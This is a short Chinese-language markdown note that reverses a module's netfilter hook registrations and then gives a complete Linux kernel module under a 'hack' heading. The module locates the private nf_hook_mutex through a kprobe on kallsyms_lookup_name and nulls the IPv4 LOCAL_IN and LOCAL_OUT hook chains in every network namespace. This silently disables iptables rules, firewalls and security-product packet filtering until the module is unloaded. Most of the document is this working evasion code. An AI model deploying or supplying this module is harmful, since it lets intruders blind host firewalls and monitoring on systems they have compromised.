# reverse
```c
{
    .hook = offset sub_1770,
    .pf = 2, //NFPROTO_IPV4
    .hooknum = 0x1,//NF_INET_LOCAL_IN
    .priority = 0,
},
{
    .hook = offset sub_1460,
    .pf = 2, //NFPROTO_IPV4
    .hooknum = 0x3,//NF_INET_LOCAL_OUT
    .priority = 0,
},
```



内核注册函数为：nf_register_net_hook （低版本下为：nf_register_hook）

```
nf_register_net_hook(&init_net,....)
```



# hack

```c
#include <net/net_namespace.h>

#define nf_entry_dereference(e) \
	rcu_dereference_protected(e, lockdep_is_held(&nf_hook_mutex))

struct nf_hook_entries __rcu **pp;
struct net *net;
struct nf_hook_entries *orig_hook_entries, *new_hooks = NULL;

for_each_net(net) {
   pp = net->nf.hooks_ipv4 + hooknum;
   
   mutex_lock(&nf_hook_mutex);
   
   orig_hook_entries = nf_entry_dereference(*pp);
   rcu_assign_pointer(*pp, NULL);
   
   mutex_unlock(&nf_hook_mutex);
}
```

# code 

```c
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/version.h>
#include <linux/kprobes.h>
#include <net/net_namespace.h>

static struct kprobe kp = {
    .symbol_name = "kallsyms_lookup_name"
};
typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
static kallsyms_lookup_name_t my_kallsyms_lookup_name;
static void init_ksymbol(void){
    
    register_kprobe(&kp);
    my_kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;
    unregister_kprobe(&kp);
}


#define NET_MAX_COUNT 255
struct original_net_data{
    struct net *net;
    struct nf_hook_entries *orig_ipv4_in_hook_entries;
    struct nf_hook_entries *orig_ipv4_out_hook_entries;
};
struct mutex *p_nf_hook_mutex = NULL;
struct original_net_data net_backup_datas[NET_MAX_COUNT];
#define nf_entry_dereference(e) \
    rcu_dereference_protected(e, lockdep_is_held(p_nf_hook_mutex))

static void backup_and_reset_one_net_ipv4_hook_entries(struct net *net,int hooknum,int idx)
{
    struct nf_hook_entries *orig_hook_entries;
    struct nf_hook_entries __rcu **pp;

    if(ARRAY_SIZE(net->nf.hooks_ipv4) <= hooknum) return;
    pp = net->nf.hooks_ipv4 + hooknum;
    if(!pp) return;

    mutex_lock(p_nf_hook_mutex);

    orig_hook_entries = nf_entry_dereference(*pp);
    rcu_assign_pointer(*pp, NULL);

    mutex_unlock(p_nf_hook_mutex);

    if(hooknum == NF_INET_LOCAL_IN){
        net_backup_datas[idx].orig_ipv4_in_hook_entries = orig_hook_entries;
    }

    if(hooknum == NF_INET_LOCAL_OUT){
        net_backup_datas[idx].orig_ipv4_out_hook_entries = orig_hook_entries;
    }
    net_backup_datas[idx].net = net;
}

static void backup_and_reset_nets_ipv4_hook_entries(void)
{
    struct net *net;
    int i = 0;

    for_each_net(net) {
        backup_and_reset_one_net_ipv4_hook_entries(net,NF_INET_LOCAL_IN,i);
        backup_and_reset_one_net_ipv4_hook_entries(net,NF_INET_LOCAL_OUT,i);
        i++;
    }
}

static void restore_one_net_ipv4_hook_entries(struct net *net,int hooknum)
{
    struct nf_hook_entries __rcu **pp;
    struct original_net_data *orig_net_data = NULL;
    int i = 0;

    if(ARRAY_SIZE(net->nf.hooks_ipv4) <= hooknum) return;
    pp = net->nf.hooks_ipv4 + hooknum;
    if(!pp) return;
    
    for(i = 0;i<NET_MAX_COUNT;i++){
        if(net_backup_datas[i].net == net){
            orig_net_data = &net_backup_datas[i];
            break;
        }
    }

    if(orig_net_data == NULL) return;

    mutex_lock(p_nf_hook_mutex);
    if(hooknum == NF_INET_LOCAL_IN){
        rcu_assign_pointer(*pp, orig_net_data->orig_ipv4_in_hook_entries);
    }
    if(hooknum == NF_INET_LOCAL_OUT){
        rcu_assign_pointer(*pp, orig_net_data->orig_ipv4_out_hook_entries);
    }
    mutex_unlock(p_nf_hook_mutex);
}

static void restore_nets_ipv4_hook_entries(void)
{
    struct net *net;
    int i = 0;

    for_each_net(net) {
        restore_one_net_ipv4_hook_entries(net,NF_INET_LOCAL_IN);
        restore_one_net_ipv4_hook_entries(net,NF_INET_LOCAL_OUT);
        i++;
    }
}

static int __init hello_init(void)
{
    printk("hello module init\n");
    init_ksymbol();

    p_nf_hook_mutex = (struct mutex*)my_kallsyms_lookup_name("nf_hook_mutex");
    if(p_nf_hook_mutex == NULL){
        printk("get nf_hook_mutex error\n");
        return -1;
    }

    backup_and_reset_nets_ipv4_hook_entries();

    return 0;
}

static void __exit hello_exit(void)
{
    printk("hello module exit\n");

    restore_nets_ipv4_hook_entries();
}

module_init(hello_init);
module_exit(hello_exit);
MODULE_LICENSE("GPL");
```

# 资料

浅入浅出 iptables 原理：在内核里骚一把 netfilter~

https://zhuanlan.zhihu.com/p/507786224